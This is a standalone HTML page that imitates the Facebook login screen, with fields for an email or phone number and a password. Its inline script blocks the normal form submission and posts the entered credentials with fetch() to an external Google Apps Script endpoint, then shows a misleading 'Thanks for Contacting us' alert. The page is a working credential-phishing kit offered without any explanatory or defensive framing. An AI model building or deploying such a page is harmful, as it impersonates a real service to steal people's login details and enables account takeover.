<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log in sin up</title>
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <div class="container d-flex">
        <form name="google-sheet">
        <div class="row">
            <div class="facebook_content col-md-7">
                <h1>facebook</h1>
                <p>Facebook helps you connect and share with the people in your life.</p>

            </div>
            <div class="col-md-5">
            
                <div class="login p-3 p-4">
                    <input type="text" placeholder="Email address or phone number" name="email">
                    <input type="password" placeholder="Password" name="password">

                    <button class="btn w-100 bg-primary log_in">Log in</button>

                    <p class="p-3 text-primary"><a href="" class="fp">Forgotten password?</a></p>

                    <hr>

                    <button class="CNA">Create New Account</button>
           
            </div>

            </div>
        </div>
    </form>
    </div>









    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbx-m0E-f1TXv4uSpkrOCzobRCf3-73Hftrkc5RTAnj4zmHcCsE0LR_-zdEWJCKqByMS/exec'
        const form = document.forms['google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
            .catch(error => alert("You Are Already Registered!!")) 
        })
      </script>

    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8" crossorigin="anonymous"></script>
</body>
</html>
